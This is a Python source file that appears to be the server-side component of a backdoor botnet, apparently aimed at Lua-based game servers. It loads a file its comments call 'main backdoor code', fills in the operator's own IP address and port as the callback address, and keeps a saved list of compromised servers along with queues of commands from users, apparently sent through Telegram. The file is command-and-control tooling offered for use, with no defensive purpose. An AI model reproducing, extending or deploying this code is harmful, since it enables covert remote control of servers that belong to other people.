"""Server Handling Routines"""
import constants


class ServerHandler():
    """Class ServerHandler"""

    def __init__(self):
        """Constructor"""
        self.servers = {}
        self.queue_author = {}

        self.server_time = {}
        self.current_server = {}

    def init_tg(self, handler):
        self.tg = handler

    def get_header(self):
        """Get main LUA code"""
        try:
            backdoor_code = open('./includes/memes.lua', 'r').read()
            backdoor_code = backdoor_code.replace(
                "{MYADDRESS}",
                constants.PUBLIC_IP + ":" + str(constants.PORT))
            return backdoor_code+"\n"
        except Exception:
            print(
                "Could not open main backdoor code!",
                "Please check your files.")
            return "nil"

    def get_sent_header(self):
        """Telegram bullshit"""
        try:
            send_funcs = open('./includes/sent_header.lua', 'r').read()
            send_funcs = send_funcs.replace(
                "{MYADDRESS}",
                constants.PUBLIC_IP + ":" + str(constants.PORT))
            return send_funcs+"\n"
        except Exception:
            print(
                "Could not open sent_header.lua POST Requests will be recieved incorrectly!",
                "Please check your files.")
            return "nil"

    def get_current_server(self, uid):
        """Get Current Server"""
        try:
            return self.current_server[uid]
        except KeyError:
            return "nil"

    def set_current_server(self, server, uid):
        """Set Current Server"""
        self.current_server[uid] = server

    def set_server_time(self, srv, time):
        """Update server CurTime"""
        self.server_time[srv] = {'curtime': time}

    def set_queue_author(self, srv, userid):
        self.queue_author[srv].append(userid)

    def remove_server(self, srv):
        self.servers.pop(srv)
        self._save_servers()

    def load_servers(self):
        """Load servers from saved files"""
        self.current_server = {}
        filepath = 'server.list'
        try:
            with open(filepath) as fpath:
                for cnt, line in enumerate(fpath):
                    if line != '\n':
                        srv = line.rstrip()
                        self.servers[srv] = []
                        self.queue_author[srv] = []
                        self.set_server_time(line.rstrip(), 0)
                        print('[Autorun] Successful added ' +
                              line + ' to the list')
            fpath.close()
        except FileNotFoundError:
            print(
                "Error opening server list file! ",
                "File doesn't exist. Creating new file.")
            file = open(filepath, 'w+')
            file.close()
        except Exception:
            print("Error opening server list file! nil by default")

    def _save_servers(self):
        filepath = 'server.list'
        try:
            with open(filepath, 'w') as fpath:
                for k in self.servers.keys():
                    fpath.write(k + "\n")
            fpath.close()
        except FileNotFoundError:
            print(
                "Error opening server list file! ",
                "File doesn't exist. Creating new file.")
            file = open(filepath, 'w+')
            file.close()
        except Exception:
            print("Error opening server list file! nil by default")
